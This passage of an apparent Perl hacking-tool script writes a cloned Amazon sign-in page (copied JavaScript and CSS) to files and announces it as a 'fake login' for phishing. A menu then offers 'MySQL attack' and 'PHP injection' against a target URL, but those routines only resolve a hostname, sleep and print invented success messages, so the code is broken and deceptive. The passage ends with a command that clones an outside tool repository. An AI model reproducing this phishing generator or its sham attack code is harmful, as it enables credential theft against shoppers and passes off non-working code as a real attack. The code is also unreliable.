ue_csm.ue.exec(function(w,a){function q(){if(d&&f){var a;a:{try{a=d.getItem(g);break a}catch(c){}a=void 0}if(a)return b=a,!0}return!1}function r(){b=h;k();if(f)try{d.setItem(g,b)}catch(a){}}function s(){b=1===a.ue_adb_chk?l:h;k();if(f)try{d.setItem(g,b)}catch(c){}}function m(){a.ue_adb_rtla&&c&&0<c.ec&&!1===n&&(c.elh=null,ueLogError({m:"Hit Info",fromOnError:1},{logLevel:"INFO",adb:b}),n=!0)}function k(){e.tag(b);e.isl&&a.uex&&uex("at",b);p&&p.updateCsmHit("adb",b);c&&0<c.ec?m():a.ue_adb_rtla&&c&&
(c.elh=m)}function t(){return b}if(a.ue_adb){a.ue_fadb=a.ue_fadb||10;var e=a.ue,h="adblk_yes",l="adblk_no",b="adblk_unk",d;a:{try{d=a.localStorage;break a}catch(x){}d=void 0}var g="csm:adb",c=a.ue_err,p=e.cookie,f=void 0!==a.localStorage,u=Math.random()>1-1/a.ue_fadb,n=!1,v=q();u||!v?e.uels("https://m.media-amazon.com/images/G/01/csm/showads.v2.js",{onerror:r,onload:s}):k();a.ue_isAdb=t;a.ue_isAdb.unk="adblk_unk";a.ue_isAdb.no=l;a.ue_isAdb.yes=h}},"adb")(document,window);




(function(c,l,m){function h(a){if(a)try{if(a.id)return"//*[@id='"+a.id+"']";var b,d=1,e;for(e=a.previousSibling;e;e=e.previousSibling)e.nodeName===a.nodeName&&(d+=1);b=d;var c=a.nodeName;1!==b&&(c+="["+b+"]");a.parentNode&&(c=h(a.parentNode)+"/"+c);return c}catch(f){return"DETACHED"}}function f(a){if(a&&a.getAttribute)return a.getAttribute(k)?a.getAttribute(k):f(a.parentElement)}var k="data-cel-widget",g=!1,d=[];(c.ue||{}).isBF=function(){try{var a=JSON.parse(localStorage["csm-bf"]||"[]"),b=0<=a.indexOf(c.ue_id);
a.unshift(c.ue_id);a=a.slice(0,20);localStorage["csm-bf"]=JSON.stringify(a);return b}catch(d){return!1}}();c.ue_utils={getXPath:h,getFirstAscendingWidget:function(a,b){c.ue_cel&&c.ue_fem?!0===g?b(f(a)):d.push({element:a,callback:b}):b()},notifyWidgetsLabeled:function(){if(!1===g){g=!0;for(var a=f,b=0;b<d.length;b++)if(d[b].hasOwnProperty("callback")&&d[b].hasOwnProperty("element")){var c=d[b].callback,e=d[b].element;"function"===typeof c&&"function"===typeof a&&c(a(e))}d=null}},extractStringValue:function(a){if("string"===
typeof a)return a}}})(ue_csm,window,document);





ue_csm.ue_unrt = 1500;
(function(d,b,t){function u(a,b){var c=a.srcElement||a.target||{},e={k:w,t:b.t,dt:b.dt,x:a.pageX,y:a.pageY,p:f.getXPath(c),n:c.nodeName};a.button&&(e.b=a.button);c.type&&(e.ty=c.type);c.href&&(e.r=f.extractStringValue(c.href));c.id&&(e.i=c.id);c.className&&c.className.split&&(e.c=c.className.split(/\s+/));g+=1;f.getFirstAscendingWidget(c,function(a){e.wd=a;d.ue.log(e,r)})}function x(a){if(!y(a.srcElement||a.target)){k+=1;n=!0;var v=h=d.ue.d(),c;p&&"function"===typeof p.now&&a.timeStamp&&(c=p.now()-
a.timeStamp,c=parseFloat(c.toFixed(2)));s=b.setTimeout(function(){u(a,{t:v,dt:c})},z)}}function A(a){if(a){var b=a.filter(B);a.length!==b.length&&(q=!0,l=d.ue.d(),n&&q&&(l&&h&&d.ue.log({k:C,t:h,m:Math.abs(l-h)},r),m(),q=!1,l=0))}}function B(a){if(!a)return!1;var b="characterData"===a.type?a.target.parentElement:a.target;if(!b||!b.hasAttributes||!b.attributes)return!1;var c={"class":"gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),id:["dealClock",
"deal_expiry_timer","timer"],role:["timer"]},e=!1;Object.keys(c).forEach(function(a){var d=b.attributes[a]?b.attributes[a].value:"";(c[a]||"").forEach(function(a){-1!==d.indexOf(a)&&(e=!0)})});return e}function y(a){if(!a)return!1;var b=(f.extractStringValue(a.nodeName)||"").toLowerCase(),c=(f.extractStringValue(a.type)||"").toLowerCase(),d=(f.extractStringValue(a.href)||"").toLowerCase();a=(f.extractStringValue(a.id)||"").toLowerCase();var g="checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
if(-1!==["select","textarea","html"].indexOf(b)||"input"===b&&-1!==g.indexOf(c)||"a"===b&&-1!==d.indexOf("http")||-1!==["sitbreaderrightpageturner","sitbreaderleftpageturner","sitbreaderpagecontainer"].indexOf(a))return!0}function m(){n=!1;h=0;b.clearTimeout(s)}function D(){b.ue.onSushiUnload(function(){ue.event({violationType:"unresponsive-clicks",violationCount:g,totalScanned:k},"csm","csm.ArmoredCXGuardrailsViolation.3")});b.ue.onunload(function(){ue.count("armored-cxguardrails.unresponsive-clicks.violations",
g);ue.count("armored-cxguardrails.unresponsive-clicks.violationRate",g/k*100||0)})}if(b.MutationObserver&&b.addEventListener&&Object.keys&&d&&d.ue&&d.ue.log&&d.ue_unrt&&d.ue_utils){var z=d.ue_unrt,r="cel",w="unr_mcm",C="res_mcm",p=b.performance,f=d.ue_utils,n=!1,h=0,s=0,q=!1,l=0,g=0,k=0;b.addEventListener&&(b.addEventListener("mousedown",x,!0),b.addEventListener("beforeunload",m,!0),b.addEventListener("visibilitychange",m,!0),b.addEventListener("pagehide",m,!0));b.ue&&b.ue.event&&b.ue.onSushiUnload&&
b.ue.onunload&&D();(new MutationObserver(A)).observe(t,{childList:!0,attributes:!0,characterData:!0,subtree:!0})}})(ue_csm,window,document);


ue_csm.ue.exec(function(g,e){if(e.ue_err){var f="";e.ue_err.errorHandlers||(e.ue_err.errorHandlers=[]);e.ue_err.errorHandlers.push({name:"fctx",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel)if(f=g.getElementsByTagName("html")[0].innerHTML){var b=f.indexOf("var ue_t0=ue_t0||+new Date();");if(-1!==b){var b=f.substr(0,b).split(String.fromCharCode(10)),d=Math.max(b.length-10-1,0),b=b.slice(d,b.length-1);a.fcsmln=d+b.length+1;a.cinfo=a.cinfo||{};for(var c=0;c<b.length;c++)a.cinfo[d+c+1+""]=
b[c]}b=f.split(String.fromCharCode(10));a.cinfo=a.cinfo||{};if(!(a.f||void 0===a.l||a.l in a.cinfo))for(c=+a.l-1,d=Math.max(c-5,0),c=Math.min(c+5,b.length-1);d<=c;d++)a.cinfo[d+1+""]=b[d]}}})}},"fatals-context")(document,window);


(function(m,a){function c(k){function f(b){b&&"string"===typeof b&&(b=(b=b.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i))&&1<b.length?b[1]:null,b&&b&&("number"===typeof e[b]?e[b]++:e[b]=1))}function d(b){var e=10,d=+new Date;b&&b.timeRemaining?e=b.timeRemaining():b={timeRemaining:function(){return Math.max(0,e-(+new Date-d))}};for(var c=a.performance.getEntries(),k=e;g<c.length&&k>n;)c[g].name&&f(c[g].name),g++,k=b.timeRemaining();g>=c.length?h(!0):l()}function h(b){if(!b){b=m.scripts;var c;if(b)for(var d=
0;d<b.length;d++)(c=b[d].getAttribute("src"))&&"undefined"!==c&&f(c)}0<Object.keys(e).length&&(p&&ue_csm.ue&&ue_csm.ue.event&&ue_csm.ue.event({domains:e,pageType:a.ue_pty||null,subPageType:a.ue_spty||null,pageTypeId:a.ue_pti||null},"csm","csm.CrossOriginDomains.2"),a.ue_ext=e)}function l(){!0===k?d():a.requestIdleCallback?a.requestIdleCallback(d):a.requestAnimationFrame?a.requestAnimationFrame(d):a.setTimeout(d,100)}function c(){if(a.performance&&a.performance.getEntries){var b=a.performance.getEntries();
!b||0>=b.length?h(!1):l()}else h(!1)}var e=a.ue_ext||{};a.ue_ext||c();return e}function q(){setTimeout(c,r)}var s=a.ue_dserr||!1,p=!0,n=1,r=2E3,g=0;a.ue_err&&s&&(a.ue_err.errorHandlers||(a.ue_err.errorHandlers=[]),a.ue_err.errorHandlers.push({name:"ext",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel){var f=c(!0),d=[],h;for(h in f){var f=h,g=f.match(/amazon(\.com?)?\.\w{2,3}$/i);g&&1<g.length||-1!==f.indexOf("amazon-adsystem.com")||-1!==f.indexOf("amazonpay.com")||-1!==f.indexOf("cloudfront-labs.amazonaws.com")||
d.push(h)}a.ext=d}}}));a.ue&&a.ue.isl?c():a.ue&&ue.attach&&ue.attach("load",q)})(document,window);





ue_csm.ue.exec(function(b,e){function q(){for(var a=0;a<f.length;a++)a:for(var d=r.replace(A,f[a])+g[f[a]]+s,c=arguments,b=0;b<c.length;b++)try{c[b].send(d);break a}catch(e){}g={};f=[];m=0;k=n}function t(){q(B,u)}function v(a,l,c){p++;if(p>w)d.count&&1==p-w&&(d.count("WeblabTriggerThresholdReached",1),b.ue_int&&console.error("Number of max call reached. Data will no longer be send"));else{var h=c||{};h&&-1<h.constructor.toString().indexOf(C)&&a&&-1<a.constructor.toString().indexOf(x)&&l&&-1<l.constructor.toString().indexOf(x)?
(h=b.ue_id,c&&c.rid&&(h=c.rid),c=h,a=encodeURIComponent(",wl="+a+"/"+l),2E3>a.length+n?(2E3<k+a.length&&t(),void 0===g[c]&&(g[c]="",f.push(c)),g[c]+=a,k+=a.length,m||(m=e.setTimeout(t,D))):b.ue_int&&console.error("Invalid API call. The input provided is over 2000 chars.")):d.count&&(d.count("WeblabTriggerImproperAPICall",1),b.ue_int&&console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))}}function E(){d.trigger&&d.trigger.isStub&&
d.trigger.replay(function(a){v.apply(this,a)})}function y(){z||(f.length&&q(u),z=!0)}var s=":1234",r="//"+b.ue_furl+"/1/remote-weblab-triggers/1/OE/"+b.ue_mid+":"+b.ue_sid+":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",A="PLCHLDR_RID",D=b.wtt||1E4,n=r.length+s.length,w=b.mwtc||2E3,F=e.XMLHttpRequest&&"withCredentials"in new e.XMLHttpRequest,x="String",C="Object",d=b.ue,g={},f=[],k=n,m,z=!1,p=0,B=function(){return{send:function(a){if(F){var b=new e.XMLHttpRequest;b.open("GET",a,!0);b.send()}else throw"";
}}}(),u=function(){return{send:function(a){(new Image).src=a}}}();e.encodeURIComponent&&(d.attach&&(d.attach("beforeunload",y),d.attach("pagehide",y)),E(),d.trigger=v)},"client-wbl-trg")(ue_csm,window);


(function(k,d,h){function f(a,c,b){a&&a.indexOf&&0===a.indexOf("http")&&0!==a.indexOf("https")&&l(s,c,a,b)}function g(a,c,b){a&&a.indexOf&&(location.href.split("#")[0]!=a&&null!==a&&"undefined"!==typeof a||l(t,c,a,b))}function l(a,c,b,e){m[b]||(e=u&&e?n(e):"N/A",d.ueLogError&&d.ueLogError({message:a+c+" : "+b,logLevel:v,stack:"N/A"},{attribution:e}),m[b]=1,p++)}function e(a,c){if(a&&c)for(var b=0;b<a.length;b++)try{c(a[b])}catch(d){}}function q(){return d.performance&&d.performance.getEntriesByType?
d.performance.getEntriesByType("resource"):[]}function n(a){if(a.id)return"//*[@id='"+a.id+"']";var c;c=1;var b;for(b=a.previousSibling;b;b=b.previousSibling)b.nodeName==a.nodeName&&(c+=1);b=a.nodeName;1!=c&&(b+="["+c+"]");a.parentNode&&(b=n(a.parentNode)+"/"+b);return b}function w(){var a=h.images;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"img",a);g(b,"img",a)})}function x(){var a=h.scripts;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"script",a);g(b,"script",a)})}
function y(){var a=h.styleSheets;a&&a.length&&e(a,function(a){if(a=a.ownerNode){var b=a.getAttribute("href");f(b,"style",a);g(b,"style",a)}})}function z(){if(A){var a=q();e(a,function(a){f(a.name,a.initiatorType)})}}function B(){e(q(),function(a){g(a.name,a.initiatorType)})}function r(){var a;a=d.location&&d.location.protocol?d.location.protocol:void 0;"https:"==a&&(z(),w(),x(),y(),B(),p<C&&setTimeout(r,D))}var s="[CSM] Insecure content detected ",t="[CSM] Ajax request to same page detected ",v="WARN",
m={},p=0,D=k.ue_nsip||1E3,C=5,A=1==k.ue_urt,u=!0;ue_csm.ue_disableNonSecure||(d.performance&&d.performance.setResourceTimingBufferSize&&d.performance.setResourceTimingBufferSize(300),r())})(ue_csm,window,document);


var ue_aa_a = "";
if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
}
(function(f,b){function g(){try{b.PerformanceObserver&&"function"===typeof b.PerformanceObserver&&(a=new b.PerformanceObserver(function(b){c(b.getEntries())}),a.observe(d))}catch(h){k()}}function m(){for(var h=d.entryTypes,a=0;a<h.length;a++)c(b.performance.getEntriesByType(h[a]))}function c(a){if(a&&Array.isArray(a)){for(var c=0,e=0;e<a.length;e++){var d=l.indexOf(a[e].name);if(-1!==d){var g=Math.round(b.performance.timing.navigationStart+a[e].startTime);f.uet(n[d],void 0,void 0,g);c++}}l.length===
c&&k()}}function k(){a&&a.disconnect&&"function"===typeof a.disconnect&&a.disconnect()}if("function"===typeof f.uet&&b.performance&&"object"===typeof b.performance&&b.performance.getEntriesByType&&"function"===typeof b.performance.getEntriesByType&&b.performance.timing&&"object"===typeof b.performance.timing&&"number"===typeof b.performance.timing.navigationStart){var d={entryTypes:["paint"]},l=["first-paint","first-contentful-paint"],n=["fp","fcp"],a;try{m(),g()}catch(p){f.ueLogError(p,{logLevel:"ERROR",
attribution:"performanceMetrics"})}}})(ue_csm,window);


if (window.csa) {
    csa("Events")("setEntity", {
        page:{pageType: "AuthenticationPortal", subPageType: "SignInClaimCollect", pageTypeId: ""}
    });
}



}
/* ◬ */
</script>

</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:138-8036082-0992152:M49R8JGG5Z1BWJV74PY6$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DM49R8JGG5Z1BWJV74PY6:0' alt=""/>
</noscript>


<div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>
            };
            };    # here is the finished 

            my $amazonLoginCss = "stylesheet.css";
            unless (open FILE, '>'.$amazonLoginCss) {
               die color("red"), "[+] Cannot create the login page - $@", color("reset");
            }

            print FILE q
            {
            .a-js .cvf-widget-section-no-js {
 display:none
}
.a-no-js .cvf-widget-section-js {
 display:none
}
.a-js .cvf-widget-btn-resend-compact {
 display:block
}
.a-js .cvf-widget-btn-resend {
 display:none
}
.a-no-js .cvf-widget-btn-resend-compact {
 display:none
}
.a-no-js .cvf-widget-btn-resend {
 display:block
}
.cvf-link-disabled {
 pointer-events:none;
 cursor:default;
 color:#767676!important
}
.cvf-link {
 color:#0066c0
}
.cvf-hidden {
 display:none
}
.cvf-alert-section {
 margin-bottom:1px!important
}
.cvf-word-break {
 word-break:break-all
}
.cvf-widget-alert-message {
 height:auto;
 max-height:20 em;
 transition:max-height .25s ease-in
}
.cvf-widget-input-code-label {
 font-weight:700
}
#cvf-resend-code-section,
#cvf-skip-code-section {
 display:inline
}
.cvf-text-truncate {
 text-overflow:ellipsis;
 white-space:nowrap;
 overflow:hidden
}
.cvf-widget-btn-verify-account-switcher {
 cursor:pointer
}
.cvf-alexa-dropdown {
 -webkit-appearance:none;
 background-color:#e7e9ec;
 padding:1.2rem 1.6rem 1.2rem 1.7rem;
 width:100%
}
.cvf-alexa-arrow-icon {
 position:absolute;
 top:50%;
 right:2.6rem;
 margin-top:-.6rem
}
.cvf-widget-container {
 width:27em!important;
 margin-left:auto;
 margin-right:auto
}
.cvf-account-switcher-add-account-icon {
 background-image:url(https://m.media-amazon.com/images/G/01/AUIClients/CVFAssets-add-account-icon-4ab9fe0b2c6f655a4b8b9810598455919fb1f8a1._V2_.png);
 background-size:contain
}
.cvf-account-switcher-check-mark-icon {
 background-image:url(https://m.media-amazon.com/images/G/01/AUIClients/CVFAssets-check-mark-7aa40824b502a4749e4d0d71b8c9ce86a95660d4._V2_.png);
 background-size:contain;
 width:50px;
 height:50px;
 background-repeat:no-repeat;
 background-position:-13px 0
}
.cvf-account-switcher-account-signed-out-avatar-icon {
 background-image:url(https://m.media-amazon.com/images/G/01/AUIClients/CVFAssets-account-signed-out-avatar-f2aa7f736e141d3dc959bf31f9f64b6dc3b26d27._V2_.png);
 background-size:contain
}
.cvf-account-switcher-profile-image {
 border-radius:50%;
 height:50px;
 width:50px
}
.cvf-account-switcher-profile-details-auth-prompt {
 padding-left:60px;
 position:absolute
}
.cvf-account-switcher-profile-business-name {
 font-weight:700
}
.cvf-account-switcher-check-mark-area {
 width:30px;
 height:50px
}
.cvf-account-switcher-claim {
 color:#555
}
.cvf-account-switcher-spacing-base {
 margin-bottom:15px
}
.cvf-account-switcher-spacing-micro-auth-prompt {
 margin-bottom:5px
}
.cvf-account-switcher-spacing-top-micro {
 margin-top:5px
}
.cvf-account-switcher-spacing-top-base-auth-prompt {
 margin-top:15px
}
.cvf-account-switcher-spacing-top-base-mobile {
 margin-top:10px
}

            };  # HERE IS THE FINISHED 2
         sleep (4);
         print color("green"), "[+] The cloning of login pake to create the fake login is successfully \n", color("reset");

         } else {
            system("clear");
            all();
         }

      } elsif ($choose == "9") {
         print q
         {
         Choose of this bellow the list
         
         1. Attacking database MySql
         2. Injection PHP method 
         };

         print color("blue"), "Choose The list : ", color("reset");
         my $attackWebUrl = <STDIN>;
         chop $attackWebUrl;

         if ( $attackWebUrl == "1" ) {
            print color("blue"), "Enter url target http://example.com : ", color("reset");
            my $hostTarget = <STDIN>;
            chop $hostTarget;

            if ( $uril !~ /http\//) {$uril = "$hostTarget"; }

            my $connect = shift;
            $connect = gethostbyname($uril);
            
            @reques = (
              'MySql' => 'username', 
              'MySql' => 'password'
            );

            print color("yellow"), "[+] Please wait to create connection \n", color("reset");
            sleep(3);
            
            connect => $connect;

            sleep(6);
            print color("yellow"), "[+] Getting the mysql parameter \n", color("reset");
            my $allMySql = $connect;
            (defined $getdata{'mysql'});
            unless ( $getdata = <@reques>.$allMySql ) {
              die color("red"), "[!] Mysql parameter failed to view content - $@", color("reset");
            }

            for $admin(@reques) {
               print color("green"), "Parameter found ... \n", color("reset");
               print color("green"), "Getting parameter found : MYSQL in $admin \n", color("reset");
            }

            all();
         } elsif ( $attackWebUrl == "2" ) {
           print color("yellow"), "PHP injectionin website \n", color("reset");
           print color("yellow"), "This method, only injection php file in website \n", color("reset");
           print "For example : http://example.com/index.php \n";
           print "\n";

           print color("blue"), "Url for attacking method : ", color("reset");
           $atkUrl = <STDIN>;
           chop $atkUrl;
           if ($urk !~ /http\//) {$urk = "$atkUrl"; }
           
           print color("yellow"), "[+] Please wait to create connection \n", color("reset");
           $hostNamePHP = gethostbyname($urk);
           chomp($hostNamePHP);
           connect => $hostNamePHP;
           sleep(3);
           
           print color("green"), "[+] Getting php file attacking data ...  \n", color("reset");
           sleep(4);

           my $phpfile = $hostNamePHP;
           unless (defined($phpfile->{'index.php'} || $phpfile{'index.php'})) {
             print color("red"), "[!] Cannot getting the parameter PHP file 1 \n", color("reset");
           }
           
           my $phpfile2 = $hostNamePHP;
           unless (defined($phpfile2->{'admin.php'} || $phpfile2{'admin.php'})) {
             print color("red"), "[!] Cannot getting the parameter PHP file 2 \n", color("reset");
           }
           
           my $phpfile3 = $hostNamePHP;
           unless (defined($phpfile3->{'login.php'} || $phpfile3{'login.php'})) {
             print color("red"), "[!] Cannot getting the parameter PHP file 3 \n", color("reset");
           }
           
           my $phpfile4 = $hostNamePHP;
           unless (defined($phpfile4->{'admin_login.php'} || $phpfile4{'admin_login.php'})) {
             print color("red"), "[!] Cannot getting the parameter PHP file 4 \n", color("reset");
           }
         
           sleep(4);
           print color("yellow"), "[+] Please wait to checking the result ... \n", color("reset");
           my $getAllInfo;
           $getAllInfo ne '';
           $phpfile->{'index.php'} = $getAllInfo;

           $phpfile2->{'admin.php'} = $getAllInfo;

           $phpfile3->{'login.php'} = $getAllInfo;

           $phpfile4->{'admin_login.php'} = $getAllInfo;
           sleep(4);
           unless(defined $phpfile{'index.php'}) {print color("green"), "[+] Checking the php : index.php file \n", color("reset")}
           unless(defined $phpfile2{'admin.php'}) {print color("green"), "[+] Checking the php : admin.php file \n", color("reset")}
           unless(defined $phpfile3{'login.php'}) {print color("green"), "[+] Checking the php : login.php file \n", color("reset")}
           unless(defined $phpfile4{'admin_login.php'}) {print color("green"), "[+] Checking the php : admin_login.php file \n", color("reset")}
           
           if ($phpfile = 0) {
             print color("green"), "[+] Checking successed \n", color("reset");
           }

           if ($phpfile2 = 0) {
             print color("green"), "[+] Checking successed \n", color("reset");
           }

           if ($phpfile3 = 0) {
             print color("green"), "[+] Checking successed \n", color("reset");
           }

           if ($phpfile4 = 0) {
             print color("green"), "[+] Checking successed \n", color("reset");
           }
           
           all();
         } else {
           all()
         }
      } elsif ($choose == "10") {
        system("git clone https://github.com/fukuyama-19/kraken");
      } else {
         system("clear");
         all();
      }
   }
}

if (not connect => $hstt) {
   die color("red"), "[+] Cannot connect to payload -$@ ", color("reset");
} 